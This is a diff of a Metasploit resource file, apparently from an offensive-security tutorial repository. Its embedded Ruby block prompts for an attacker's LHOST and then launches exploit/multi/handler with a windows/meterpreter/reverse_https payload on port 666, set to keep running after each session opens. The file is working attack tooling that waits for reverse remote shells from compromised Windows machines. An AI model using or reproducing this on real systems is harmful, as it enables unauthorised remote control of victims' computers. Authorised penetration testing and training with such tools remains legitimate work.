@@ -2,9 +2,27 @@
 # resource file to start one multi/handler
 # https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md
 ##
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_https
-set ExitOnSession false
-set LHOST 192.168.1.71
-set LPORT 666
-exploit
+<ruby>
+   help = %Q|
+    Description:
+      Resource File to get the LHOST variable from
+      user input and start a msf multi/handler.
+
+    Author:
+       r00t-3xp10it  <pedroubuntu10[at]gmail.com>
+
+   |
+
+   print_line(help)
+   Rex::sleep(2.0)
+   print_status("Input LHOST:")
+      addr = gets.chomp
+
+      run_single("use exploit/multi/handler")
+      run_single("set PAYLOAD windows/meterpreter/reverse_https")
+      run_single("set ExitOnSession false")
+      run_single("set LHOST #{addr}")
+      run_single("set LPORT 666")
+   run_single("exploit")
+   run_single("back")
+</ruby>
